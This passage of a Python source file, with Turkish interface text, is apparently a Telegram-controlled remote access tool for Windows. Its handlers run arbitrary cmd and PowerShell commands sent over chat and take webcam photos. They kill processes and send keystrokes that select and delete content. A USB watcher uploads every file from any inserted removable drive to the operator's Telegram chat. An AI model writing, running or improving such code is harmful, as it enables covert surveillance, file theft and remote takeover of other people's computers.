                    "üñ±Ô∏è Fare ba≈üarƒ±yla devre dƒ±≈üƒ± bƒ±rakƒ±ldƒ±!\nTekrar etkinle≈ütirmek i√ßin bilgisayarƒ± yeniden ba≈ülatƒ±n.",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=main_menu()
                )
            except Exception as e:
                bot.answer_callback_query(call.id, f"‚ùå Fare devre dƒ±≈üƒ± bƒ±rakƒ±lamadƒ±: {str(e)}")
                
        elif call.data == "disable_keyboard":
            try:
                # Ctrl+A ve Delete tu≈ülarƒ±nƒ± sim√ºle et
                subprocess.run([
                    "powershell",
                    "-Command",
                    """
                    Add-Type -AssemblyName System.Windows.Forms
                    [System.Windows.Forms.SendKeys]::SendWait('^a')
                    Start-Sleep -Milliseconds 100
                    [System.Windows.Forms.SendKeys]::SendWait('{DELETE}')
                    """
                ], shell=True, capture_output=True)
                
                bot.answer_callback_query(call.id, "‚å®Ô∏è T√ºm i√ßerik se√ßilip silindi!")
                bot.edit_message_text(
                    "‚å®Ô∏è Klavye komutu ba≈üarƒ±yla uygulandƒ±!",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=main_menu()
                )
            except Exception as e:
                bot.answer_callback_query(call.id, f"‚ùå Klavye komutu uygulanamadƒ±: {str(e)}")

        elif call.data == "taskbar_windows":
            keyboard = taskbar_menu()
            if taskbar_windows_cache:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "ü™ü G√∂rev √ßubuƒüundaki a√ßƒ±k uygulamalar:",
                    reply_markup=keyboard
                )
            else:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "ü™ü G√∂rev √ßubuƒüunda a√ßƒ±k uygulama bulunamadƒ±.",
                    reply_markup=main_menu()
                )
        elif call.data == "taskbar_full":
            keyboard = taskbar_full_menu()
            if taskbar_full_cache:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "ü™ü G√∂rev √ßubuƒüundaki sabitlenmi≈ü ve a√ßƒ±k uygulamalar:\nüü¢ = A√ßƒ±k, ‚ö™ = Kapalƒ±",
                    reply_markup=keyboard
                )
            else:
                bot.answer_callback_query(call.id)
                bot.send_message(
                    call.message.chat.id,
                    "ü™ü G√∂rev √ßubuƒüunda uygulama bulunamadƒ±.",
                    reply_markup=main_menu()
                )
        elif call.data.startswith("launch_taskbar_"):
            idx = int(call.data.split("_")[-1])
            if 0 <= idx < len(taskbar_full_cache):
                exe_path = taskbar_full_cache[idx]["path"]
                try:
                    subprocess.Popen(exe_path)
                    bot.answer_callback_query(call.id, "Uygulama ba≈ülatƒ±ldƒ±!")
                    bot.send_message(call.message.chat.id, f"‚úÖ {taskbar_full_cache[idx]['name']} ba≈ülatƒ±ldƒ±.", reply_markup=main_menu())
                except Exception as e:
                    bot.answer_callback_query(call.id, "Ba≈ülatƒ±lamadƒ±")
                    bot.send_message(call.message.chat.id, f"‚ùå Uygulama ba≈ülatƒ±lamadƒ±: {str(e)}", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, "Ge√ßersiz se√ßim")
                bot.send_message(call.message.chat.id, "‚ùå Ge√ßersiz uygulama se√ßimi.", reply_markup=main_menu())
        elif call.data.startswith("activate_window_"):
            idx = int(call.data.split("_")[-1])
            if 0 <= idx < len(taskbar_windows_cache):
                hwnd = taskbar_windows_cache[idx]["hwnd"]
                try:
                    win32gui.ShowWindow(hwnd, 5)  # SW_SHOW
                    win32gui.SetForegroundWindow(hwnd)
                    bot.answer_callback_query(call.id, "Pencere √∂ne getirildi!")
                    bot.send_message(call.message.chat.id, f"‚úÖ {taskbar_windows_cache[idx]['title']} √∂ne getirildi.", reply_markup=main_menu())
                except Exception as e:
                    bot.answer_callback_query(call.id, "Ba≈üarƒ±lamadƒ±")
                    bot.send_message(call.message.chat.id, f"‚ùå Pencere √∂ne getirilemedi: {str(e)}", reply_markup=main_menu())
            else:
                bot.answer_callback_query(call.id, "Ge√ßersiz se√ßim")
                bot.send_message(call.message.chat.id, "‚ùå Ge√ßersiz pencere se√ßimi.", reply_markup=main_menu())

        elif call.data == "scan_usb":
            bot.edit_message_text(
                "üíæ USB Diskleri Taranƒ±yor...",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=usb_drives_menu()
            )
            
        elif call.data.startswith("scan_usb_"):
            try:
                idx = int(call.data.split("_")[2])
                drives = get_usb_drives()
                if idx < len(drives):
                    drive = drives[idx]
                    bot.edit_message_text(
                        f"üíæ {drive['label']} ({drive['path']}) taranƒ±yor...",
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id
                    )
                    scan_and_send_usb_files(call.message.chat.id, drive['path'])
                    bot.send_message(
                        call.message.chat.id,
                        "‚úÖ USB disk taramasƒ± tamamlandƒ±!",
                        reply_markup=main_menu()
                    )
            except Exception as e:
                bot.answer_callback_query(call.id, f"‚ùå Hata: {str(e)}")
                
        elif call.data == "refresh_usb":
            bot.edit_message_text(
                "üíæ USB Diskleri Taranƒ±yor...",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                reply_markup=usb_drives_menu()
            )

        elif call.data == "show_processes":
            bot.edit_message_text(
                "üìä *√áalƒ±≈üan Programlar*\n"
                "Kapatmak istediƒüiniz programa tƒ±klayƒ±n:",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                parse_mode='Markdown',
                reply_markup=running_processes_menu()
            )
            
        elif call.data == "refresh_processes":
            try:
                bot.edit_message_text(
                    "üìä √áalƒ±≈üan Programlar:",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    reply_markup=running_processes_menu()
                )
                bot.answer_callback_query(call.id, "‚úÖ Liste yenilendi!")
            except Exception as e:
                bot.answer_callback_query(call.id, "‚ùå Liste yenilenemedi!")
                bot.send_message(
                    call.message.chat.id,
                    f"‚ùå Hata olu≈ütu: {str(e)}",
                    reply_markup=main_menu()
                )
            
        elif call.data.startswith("kill_process_"):
            pid = int(call.data.split("_")[2])
            try:
                process = psutil.Process(pid)
                process_name = process.name()
                process.terminate()
                bot.answer_callback_query(call.id, f"‚úÖ {process_name} ba≈üarƒ±yla kapatƒ±ldƒ±!")
                # Listeyi yenile
                bot.edit_message_text(
                    "üìä *√áalƒ±≈üan Programlar*\n"
                    "Kapatmak istediƒüiniz programa tƒ±klayƒ±n:",
                    chat_id=call.message.chat.id,
                    message_id=call.message.message_id,
                    parse_mode='Markdown',
                    reply_markup=running_processes_menu()
                )
            except Exception as e:
                bot.answer_callback_query(call.id, f"‚ùå Program kapatƒ±lamadƒ±: {str(e)}")
    except Exception as e:
        bot.answer_callback_query(call.id, "Bir hata olu≈ütu!")
        bot.send_message(call.message.chat.id, f"‚ùå Hata: {str(e)}", reply_markup=main_menu())



# Send initial message on bot startup
def send_initial_message():
    try:
        bot.send_message(
            ADMIN_CHAT_ID,
            f"üöÄ *Bot Ba≈ülatƒ±ldƒ±!*\nBaƒülanƒ±lan Cihaz: {platform.node()}\nEtkile≈üim i√ßin /start komutunu kullanƒ±n.",
            parse_mode='Markdown'
        )
    except Exception as e:
        pass

# Main execution
def handle_messagebox_text(message):
    try:
        if message.text:
            import ctypes
            import getpass
            import platform
            username = getpass.getuser()
            computer = platform.node()
            mesaj = f"{message.text}\n\nKullanƒ±cƒ±: {username}\nBilgisayar: {computer}"
            ctypes.windll.user32.MessageBoxW(0, mesaj, "Bot Uyarƒ±sƒ±", 0x40)
            bot.send_message(message.chat.id, "üí¨ MessageBox ekrana g√∂sterildi!", reply_markup=main_menu())
        else:
            bot.send_message(message.chat.id, "üö´ Mesaj bo≈ü olamaz.", reply_markup=main_menu())
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå MessageBox g√∂sterilemedi: {str(e)}", reply_markup=main_menu())

def handle_cmd_command(message):
    try:
        if message.text:
            terminal_path = find_terminal_path("cmd")
            if terminal_path:
                subprocess.Popen(
                    [terminal_path, "/k", message.text],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
                bot.edit_message_text(
                    "‚ö° Komut yeni CMD penceresinde √ßalƒ±≈ütƒ±rƒ±ldƒ±.",
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reply_markup=main_menu()
                )
            else:
                bot.edit_message_text(
                    "‚ùå CMD bulunamadƒ±.",
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reply_markup=main_menu()
                )
        else:
            bot.edit_message_text(
                "üö´ Komut bo≈ü olamaz.",
                chat_id=message.chat.id,
                message_id=message.message_id,
                reply_markup=main_menu()
            )
    except Exception as e:
        bot.edit_message_text(
            f"‚ùå Komut √ßalƒ±≈ütƒ±rƒ±lamadƒ±: {str(e)}",
            chat_id=message.chat.id,
            message_id=message.message_id,
            reply_markup=main_menu()
        )

def handle_ps_command(message):
    try:
        if message.text:
            terminal_path = find_terminal_path("powershell")
            if terminal_path:
                subprocess.Popen(
                    [terminal_path, "-NoExit", "-Command", message.text],
                    creationflags=subprocess.CREATE_NEW_CONSOLE
                )
                bot.edit_message_text(
                    "üîß Komut yeni PowerShell penceresinde √ßalƒ±≈ütƒ±rƒ±ldƒ±.",
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reply_markup=main_menu()
                )
            else:
                bot.edit_message_text(
                    "‚ùå PowerShell bulunamadƒ±.",
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    reply_markup=main_menu()
                )
        else:
            bot.edit_message_text(
                "üö´ Komut bo≈ü olamaz.",
                chat_id=message.chat.id,
                message_id=message.message_id,
                reply_markup=main_menu()
            )
    except Exception as e:
        bot.edit_message_text(
            f"‚ùå Komut √ßalƒ±≈ütƒ±rƒ±lamadƒ±: {str(e)}",
            chat_id=message.chat.id,
            message_id=message.message_id,
            reply_markup=main_menu()
        )


if __name__ == "__main__":
    send_initial_message()
    while True:
        try:
            bot.polling(none_stop=True, interval=1)  # interval'ƒ± 1 saniyeye √ßƒ±kardƒ±k
        except Exception as e:
            try:
                bot.send_message(
                    ADMIN_CHAT_ID,
                    f"‚ö†Ô∏è Bot bir hata ile kar≈üƒ±la≈ütƒ±: {str(e)}\n5 saniye i√ßinde yeniden ba≈ülatƒ±lƒ±yor...",
                    parse_mode='Markdown'
                )
            except:
                pass
            time.sleep(5)

# Function to take a photo from webcam and send it
def take_photo_and_send(chat_id):
    try:
        bot.send_message(chat_id, "üì∑ Fotoƒüraf √ßekiliyor, l√ºtfen bekleyin...")
        cap = cv2.VideoCapture(1)
        if not cap.isOpened():
            bot.send_message(chat_id, "‚ùå Web kamerasƒ± bulunamadƒ± veya a√ßƒ±lamadƒ±.", reply_markup=main_menu())
            return
        ret, frame = cap.read()
        if ret:
            photo_path = "webcam_photo.jpg"
            cv2.imwrite(photo_path, frame)
            with open(photo_path, "rb") as photo_file:
                bot.send_photo(chat_id, photo_file, caption="üì∏ ƒ∞≈üte web kamerasƒ± fotoƒürafƒ±nƒ±z!", reply_markup=main_menu())
            if os.path.exists(photo_path):
                os.remove(photo_path)
        else:
            bot.send_message(chat_id, "‚ùå Web kamerasƒ±ndan g√∂r√ºnt√º alƒ±namadƒ±.", reply_markup=main_menu())
        cap.release()
    except Exception as e:
        bot.send_message(chat_id, f"‚ùå Fotoƒüraf √ßekilirken bir hata olu≈ütu: {str(e)}", reply_markup=main_menu())

class USBHandler(FileSystemEventHandler):
    def __init__(self, bot, admin_id):
        self.bot = bot
        self.admin_id = admin_id
        self.processed_drives = set()

    def scan_drive(self, drive_path):
        try:
            files = []
            total_size = 0
            print(f"USB S√ºr√ºc√º Taranƒ±yor: {drive_path}")  # Debug mesajƒ±
            
            for root, dirs, filenames in os.walk(drive_path):
                for filename in filenames:
                    file_path = os.path.join(root, filename)
                    try:
                        size = os.path.getsize(file_path)
                        total_size += size
                        files.append({
                            'path': file_path,
                            'size': size,
                            'name': filename
                        })
                        print(f"Dosya bulundu: {filename} ({size} bytes)")  # Debug mesajƒ±
                    except Exception as e:
                        print(f"Dosya okuma hatasƒ±: {file_path} - {str(e)}")  # Debug mesajƒ±
                        continue

            if not files:
                print("Hi√ß dosya bulunamadƒ±!")  # Debug mesajƒ±
                return

            # Dosyalarƒ± boyuta g√∂re sƒ±rala
            files.sort(key=lambda x: x['size'])
            
            # USB bilgilerini g√∂nder
            self.bot.send_message(
                self.admin_id,
                f"üîå Yeni USB Disk Tespit Edildi!\n"
                f"üìÅ S√ºr√ºc√º: {drive_path}\n"
                f"üìä Toplam Boyut: {total_size / (1024*1024):.2f} MB\n"
                f"üìë Dosya Sayƒ±sƒ±: {len(files)}"
            )
            
            # Her dosyayƒ± g√∂nder
            for file in files:
                try:
                    print(f"Dosya g√∂nderiliyor: {file['path']}")  # Debug mesajƒ±
                    with open(file['path'], 'rb') as f:
                        self.bot.send_document(
                            self.admin_id,
                            f,
                            caption=f"üìÑ {file['name']}\n"
                                   f"üìç {file['path']}\n"
                                   f"üìä {file['size'] / 1024:.1f} KB",
                            timeout=60
                        )
                        time.sleep(2)  # Her dosya arasƒ±nda 2 saniye bekle
                except Exception as e:
                    print(f"Dosya g√∂nderme hatasƒ±: {str(e)}")  # Debug mesajƒ±
                    self.bot.send_message(
                        self.admin_id,
                        f"‚ùå Dosya g√∂nderilemedi: {file['path']}\nHata: {str(e)}"
                    )
                    
        except Exception as e:
            print(f"Genel hata: {str(e)}")  # Debug mesajƒ±
            self.bot.send_message(
                self.admin_id,
                f"‚ùå USB disk taranƒ±rken hata olu≈ütu: {str(e)}"
            )

    def on_created(self, event):
        try:
            if not event.is_directory:
                drive_path = os.path.splitdrive(event.src_path)[0] + "\\"
                print(f"Yeni dosya olayƒ±: {event.src_path}")  # Debug mesajƒ±
                print(f"S√ºr√ºc√º yolu: {drive_path}")  # Debug mesajƒ±
                
                if drive_path not in self.processed_drives and self.is_removable(drive_path):
                    print(f"Yeni USB s√ºr√ºc√º tespit edildi: {drive_path}")  # Debug mesajƒ±
                    self.processed_drives.add(drive_path)
                    self.scan_drive(drive_path)
        except Exception as e:
            print(f"On_created hatasƒ±: {str(e)}")  # Debug mesajƒ±

    def is_removable(self, drive):
        try:
            drive_type = win32file.GetDriveType(drive)
            is_removable = drive_type == win32con.DRIVE_REMOVABLE
            print(f"S√ºr√ºc√º kontrol√º: {drive} - √áƒ±karƒ±labilir mi: {is_removable}")  # Debug mesajƒ±
            return is_removable
        except Exception as e:
            print(f"S√ºr√ºc√º tipi kontrol√º hatasƒ±: {str(e)}")  # Debug mesajƒ±
            return False

# USB izleme i≈ülemini ba≈ülat
def start_usb_monitoring(bot, admin_id):
    event_handler = USBHandler(bot, admin_id)
    observer = Observer()
    
    # T√ºm s√ºr√ºc√ºleri izle
    for drive in range(ord('A'), ord('Z')+1):
        drive_path = f"{chr(drive)}:\\"
        try:
            if os.path.exists(drive_path):
                observer.schedule(event_handler, drive_path, recursive=False)
        except:
            continue
    
    observer.start()
    return observer

# Ana fonksiyona USB izleme √∂zelliƒüini ekle
if __name__ == '__main__':
    try:
        print("USB izleme ba≈ülatƒ±lƒ±yor...")  # Debug mesajƒ±
        event_handler = USBHandler(bot, ADMIN_CHAT_ID)
        observer = Observer()
        
        # T√ºm s√ºr√ºc√ºleri izle
        for drive in range(ord('A'), ord('Z')+1):
            drive_path = f"{chr(drive)}:\\"
            try:
                if os.path.exists(drive_path):
                    observer.schedule(event_handler, drive_path, recursive=False)
                    print(f"ƒ∞zleniyor: {drive_path}")  # Debug mesajƒ±
            except Exception as e:
                print(f"S√ºr√ºc√º izleme hatasƒ± ({drive_path}): {str(e)}")  # Debug mesajƒ±
                continue
        
        observer.start()
        print("USB izleme ba≈ülatƒ±ldƒ±!")  # Debug mesajƒ±
        
        # Mevcut USB s√ºr√ºc√ºleri kontrol et
        for drive in range(ord('A'), ord('Z')+1):
            drive_path = f"{chr(drive)}:\\"
            if os.path.exists(drive_path) and event_handler.is_removable(drive_path):
                print(f"Mevcut USB s√ºr√ºc√º bulundu: {drive_path}")  # Debug mesajƒ±
                event_handler.scan_drive(drive_path)
        
        # Bot polling'i ba≈ülat
        while True:
            try:
                bot.polling(none_stop=True, interval=1)
            except Exception as e:
                print(f"Bot hatasƒ±: {str(e)}")  # Debug mesajƒ±
                time.sleep(5)
                
    except Exception as e:
        print(f"Ana program hatasƒ±: {str(e)}")  # Debug mesajƒ±
